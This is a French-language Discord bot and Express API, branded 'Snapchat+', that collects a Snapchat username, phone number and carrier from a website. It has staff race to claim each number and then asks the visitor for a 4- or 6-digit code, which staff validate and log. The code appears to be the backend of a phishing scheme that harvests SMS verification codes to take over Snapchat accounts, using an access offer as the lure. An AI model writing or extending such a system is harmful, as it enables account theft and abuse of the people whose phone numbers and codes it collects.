const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, PermissionsBitField, ChannelType, StringSelectMenuBuilder, SlashCommandBuilder, REST, Routes } = require('discord.js');
const express = require('express');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

const DISCORD_TOKEN    = process.env.DISCORD_TOKEN    || 'TON_TOKEN_ICI';
const CLIENT_ID        = process.env.CLIENT_ID        || 'TON_CLIENT_ID_ICI'; // ⚠️ À METTRE DANS RAILWAY
const ADMIN_CHANNEL_ID = process.env.ADMIN_CHANNEL_ID || '1570890792745304245';

const ROLE_CROWN_ID    = '1541601494929907763';
const ROLE_OWNER_ID    = '1565080966693781644';
const ROLE_SUPPORT_ID  = '1541600641183387738';

const demandes = new Map();

const client = new Client({ intents: [
  GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages,
  GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers
]});

/* ═══════════════════════════════════════════════════════════════
   ENREGISTREMENT DES COMMANDES SLASH (/)
   ═══════════════════════════════════════════════════════════════ */
client.once('ready', async () => {
  console.log(`✅ Bot connecté : ${client.user.tag}`);
  client.user.setActivity('Snapchat+ | /ticket', { type: 'WATCHING' });

  const commands = [
    new SlashCommandBuilder()
      .setName('ticket')
      .setDescription('Envoyer le panneau de ticket')
      .addChannelOption(option => 
        option.setName('salon')
          .setDescription('Le salon où envoyer le panneau')
          .setRequired(true)),
    new SlashCommandBuilder()
      .setName('list')
      .setDescription('Afficher la liste de toutes les demandes (codes, blacklist, etc.)')
  ].map(command => command.toJSON());

  const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
  try {
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    console.log('✅ Commandes Slash enregistrées !');
  } catch (error) {
    console.error(error);
  }
});

/* ═══════════════════════════════════════════════════════════════
   GESTION DES INTERACTIONS
   ═══════════════════════════════════════════════════════════════ */
client.on('interactionCreate', async (interaction) => {
  
  // --- COMMANDES SLASH ---
  if (interaction.isChatInputCommand()) {
    
    // /ticket #salon
    if (interaction.commandName === 'ticket') {
      const channel = interaction.options.getChannel('salon');
      const bannerURL = 'https://i.imgur.com/NhoPWn6.png'; 

      const embed = new EmbedBuilder()
        .setTitle("🎟️ Besoin d'aide ?")
        .setDescription("> *Ouvrez un ticket en sélectionnant une catégorie ci-dessous. Notre équipe vous répondra dans les plus brefs délais.*")
        .setColor(0x2b2d31)
        .setImage(bannerURL);

      const menu = new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder().setCustomId('ticket_select').setPlaceholder('Sélectionne une catégorie...')
          .addOptions([
            { label: 'Get-Acces', description: 'Obtenir un accès', value: 'acces', emoji: '🔑' },
            { label: 'Redeem', description: 'Racheter un accès', value: 'redeem', emoji: '💎' },
            { label: 'Autre', description: 'Autre demande', value: 'autre', emoji: '❓' }
          ])
      );
      
      await channel.send({ embeds: [embed], components: [menu] });
      return interaction.reply({ content: `✅ Panneau de ticket envoyé dans ${channel}.`, ephemeral: true });
    }

    // /list
    if (interaction.commandName === 'list') {
      if (demandes.size === 0) return interaction.reply({ content: "Aucune demande pour le moment.", ephemeral: true });

      const allDemandes = Array.from(demandes.values());
      
      const pending = allDemandes.filter(d => d.status === 'pending' || d.waitingForCode);
      const accepted = allDemandes.filter(d => d.status === 'accepted');
      const rejected = allDemandes.filter(d => d.status === 'rejected');
      const blacklisted = allDemandes.filter(d => d.status === 'blacklisted');

      const formatList = (arr, showCode = false) => {
        if (arr.length === 0) return "`Aucun`";
        return arr.map(d => {
          let str = `> 👤 **@${d.username}** | 📱 \`${d.phone}\` | 🏢 \`${d.operator}\``;
          if (showCode && d.code) str += ` | 🔑 Code: \`${d.code}\``;
          return str;
        }).join('\n');
      };

      const embed = new EmbedBuilder()
        .setTitle('📂 Base de données des demandes')
        .setColor(0x2b2d31)
        .addFields(
          { name: `⏳ En attente (${pending.length})`, value: formatList(pending), inline: false },
          { name: `✅ Acceptées (${accepted.length})`, value: formatList(accepted, true), inline: false },
          { name: `❌ Refusées (${rejected.length})`, value: formatList(rejected), inline: false },
          { name: `🚫 Blacklist (${blacklisted.length})`, value: formatList(blacklisted), inline: false }
        )
        .setFooter({ text: 'Snapchat+ | Historique des codes' })
        .setTimestamp();

      return interaction.reply({ embeds: [embed], ephemeral: true });
    }
  }

  // --- MENUS ET BOUTONS ---
  if (!interaction.isButton() && !interaction.isStringSelectMenu()) return;

  if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_select') {
    const choice = interaction.values[0];
    let categoryName = 'Autre';
    if (choice === 'acces') categoryName = 'Get-Acces';
    if (choice === 'redeem') categoryName = 'Redeem';

    await interaction.reply({ content: `⏳ Création de ton ticket...`, ephemeral: true });

    try {
      const thread = await interaction.channel.threads.create({
        name: `🎫 ${categoryName} - ${interaction.user.username}`,
        type: ChannelType.PrivateThread, reason: 'Ticket client'
      });
      await thread.members.add(interaction.user.id);
      
      const embed = new EmbedBuilder()
        .setTitle(`🎫 Ticket : ${categoryName}`)
        .setDescription(`> Bonjour ${interaction.user}, un membre du staff va te répondre rapidement.\n> Explique ta demande ci-dessous.`)
        .setColor(0x2b2d31);
      const btnClose = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('close_ticket').setLabel('Fermer le ticket').setStyle(ButtonStyle.Danger).setEmoji('🔒')
      );
      await thread.send({ content: `<@&${ROLE_CROWN_ID}> <@&${ROLE_OWNER_ID}> <@&${ROLE_SUPPORT_ID}>`, embeds: [embed], components: [btnClose] });
    } catch (e) { await interaction.followUp({ content: "❌ Impossible de créer le ticket.", ephemeral: true }); }
    return;
  }

  if (interaction.isButton() && interaction.customId === 'close_ticket') {
    await interaction.reply({ content: 'Fermeture dans 5 secondes...', ephemeral: false });
    setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
    return;
  }

  // --- BOUTONS DU SITE WEB (Demandes) ---
  const args = interaction.customId.split(':');
  const action = args[0];
  const demandeId = args[args.length - 1]; 
  const demande = demandes.get(demandeId);

  if (!demande) return interaction.reply({ content: 'Ce dossier est terminé ou n\'existe plus.', ephemeral: true });

  if (action === 'claim') {
    if (demande.claimed) return interaction.reply({ content: '❌ Trop tard, ce numéro a déjà été pris !', ephemeral: true });

    demande.claimed = true;
    demande.claimedBy = interaction.user.id;
    demandes.set(demandeId, demande);

    // Modification du message original : suppression du bouton, ajout du texte "Pris par"
    const embedPris = new EmbedBuilder()
      .setTitle(`⚡ NOUVEAU NUMÉRO : ${demande.operator}`)
      .setDescription(`**Pris par ${interaction.user}**`)
      .setColor(0xFF6B00);

    await interaction.update({ embeds: [embedPris], components: [] });

    // Création du fil privé
    const thread = await interaction.channel.threads.create({
      name: `📁 Dossier - @${demande.username}`,
      type: ChannelType.PrivateThread, reason: 'Prise en charge'
    });
    
    await thread.members.add(interaction.user.id);
    demande.threadId = thread.id;
    demandes.set(demandeId, demande);

    const dossierEmbed = new EmbedBuilder()
      .setTitle('📁 FICHE DE VÉRIFICATION')
      .setColor(0x2b2d31)
      .setDescription(`> Nouveau numéro attribué pour **@${demande.username}**.`)
      .addFields(
        { name: '📱 Numéro Cible', value: `\`\`\`\n+33 ${demande.phone}\n\`\`\``, inline: false },
        { name: '👤 Snapchat', value: `\`@${demande.username}\``, inline: true },
        { name: '🏢 Opérateur', value: `\`${demande.operator}\``, inline: true }
      );

    const rowCode = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`setcode:4:${demandeId}`).setLabel('Code 4 Chiffres').setStyle(ButtonStyle.Success).setEmoji('📱'),
      new ButtonBuilder().setCustomId(`setcode:6:${demandeId}`).setLabel('Code 6 Chiffres').setStyle(ButtonStyle.Primary).setEmoji('🔢')
    );
    const rowActions = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`blacklist:${demandeId}`).setLabel('Blacklist').setStyle(ButtonStyle.Danger).setEmoji('🚫'),
      new ButtonBuilder().setCustomId(`reject:${demandeId}`).setLabel('Rejeter').setStyle(ButtonStyle.Danger).setEmoji('❌')
    );

    await thread.send({ content: `${interaction.user}, voici ton dossier :`, embeds: [dossierEmbed], components: [rowCode, rowActions] });
    return interaction.followUp({ content: `✅ Dossier déplacé : ${thread}`, ephemeral: true });
  }

  if (action === 'setcode') {
    const length = parseInt(args[1]);
    demande.codeLength = length;
    demande.waitingForCode = true;
    demandes.set(demandeId, demande);
    
    const embedWait = new EmbedBuilder()
      .setDescription(`⏳ **En attente du code à ${length} chiffres...**`)
      .setColor(0x2b2d31);
      
    await interaction.update({ embeds: [embedWait], components: [] });
  }

  if (action === 'badcode') {
    demande.waitingForCode = true;
    demandes.set(demandeId, demande);
    
    const embedBad = new EmbedBuilder()
      .setDescription(`⚠️ **Code invalide. Le client a été invité à réessayer.**`)
      .setColor(0xef4444);
      
    await interaction.update({ embeds: [embedBad], components: [] });
  }

  if (action === 'accept') {
    demande.status = 'accepted';
    demandes.set(demandeId, demande);
    
    const embedOk = new EmbedBuilder()
      .setDescription(`✅ **Code validé et dossier approuvé avec succès !**\n> *Ce fil sera supprimé dans 5 secondes.*`)
      .setColor(0x22c55e);
      
    await interaction.update({ embeds: [embedOk], components: [] });
    setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
  }
  
  if (action === 'reject' || action === 'blacklist') {
    demande.status = action === 'reject' ? 'rejected' : 'blacklisted';
    demandes.set(demandeId, demande);
    
    const embedReject = new EmbedBuilder()
      .setDescription(`❌ **Dossier rejeté ou blacklisté.**\n> *Ce fil sera supprimé dans 5 secondes.*`)
      .setColor(0xef4444);
      
    await interaction.update({ embeds: [embedReject], components: [] });
    setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
  }
});

/* ═══════════════════════════════════════════════════════════════
   API EXPRESS (Pour le site web)
   ═══════════════════════════════════════════════════════════════ */
const app = express();
app.use(cors());
app.use(express.json());

app.post('/api/demande', async (req, res) => {
  try {
    const { username, phone, operator } = req.body;
    const id = uuidv4();
    let formattedPhone = phone;
    if(phone.length === 10) formattedPhone = `${phone.slice(0,2)} ${phone.slice(2,4)} ${phone.slice(4,6)} ${phone.slice(6,8)} ${phone.slice(8,10)}`;

    const demande = { id, username, phone: formattedPhone, operator, status: 'pending', claimed: false, waitingForCode: false };
    demandes.set(id, demande);

    const channel = await client.channels.fetch(ADMIN_CHANNEL_ID).catch(() => null);
    if(!channel) return res.status(500).json({ error: 'Salon admin introuvable.' });

    // LE DESIGN DEMANDÉ POUR LA NOUVELLE COMMANDE
    const embedPublic = new EmbedBuilder()
      .setTitle(`⚡ NOUVEAU NUMÉRO : ${operator}`)
      .setDescription(`Clique sur **Prendre le numéro**, fais vite !! 🚀`)
      .setColor(0xFF6B00);
      
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`claim:${id}`).setLabel('Prendre le numéro').setStyle(ButtonStyle.Primary).setEmoji('⚡')
    );

    const msg = await channel.send({ content: `@everyone`, embeds: [embedPublic], components: [row] });
    demande.publicMsgId = msg.id;
    demandes.set(id, demande);

    res.json({ success: true, demandeId: id });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/demande/:id/status', (req, res) => {
  const demande = demandes.get(req.params.id);
  if (!demande) return res.status(404).json({ error: 'Introuvable' });
  if (demande.status === 'blacklisted') return res.json({ status: 'rejected', blacklisted: true });
  res.json({ status: demande.status, waitingForCode: demande.waitingForCode, codeLength: demande.codeLength || 4 });
});

app.post('/api/demande/:id/code', async (req, res) => {
  try {
    const { code } = req.body;
    const demande = demandes.get(req.params.id);
    if (!demande) return res.status(404).json({ error: 'Introuvable' });

    const expectedLength = demande.codeLength || 4;
    if (code.length !== expectedLength) return res.status(400).json({ error: `Code à ${expectedLength} chiffres requis.` });

    demande.waitingForCode = false;
    demande.code = code;
    demandes.set(demande.id, demande);

    const embedCode = new EmbedBuilder()
      .setTitle('🔑 CODE REÇU')
      .setColor(0x2b2d31)
      .setDescription(`> Le client a bien envoyé son code.`)
      .addFields(
        { name: '🔢 Code', value: `\`\`\`\n${code}\n\`\`\``, inline: false },
        { name: '📱 Numéro', value: `\`${demande.phone}\``, inline: true },
        { name: '👤 Snap', value: `\`@${demande.username}\``, inline: true }
      );
      
    const rowActions = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`accept:${demande.id}`).setLabel('Valider & Activer').setStyle(ButtonStyle.Success).setEmoji('✅'),
      new ButtonBuilder().setCustomId(`badcode:${demande.id}`).setLabel('Mauvais Code').setStyle(ButtonStyle.Danger).setEmoji('⚠️')
    );

    if (demande.threadId) {
      const thread = await client.channels.fetch(demande.threadId).catch(() => null);
      if (thread) await thread.send({ content: `<@${demande.claimedBy}>`, embeds: [embedCode], components: [rowActions] });
    }
    res.json({ success: true });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 API sur port ${PORT}`));
client.login(DISCORD_TOKEN);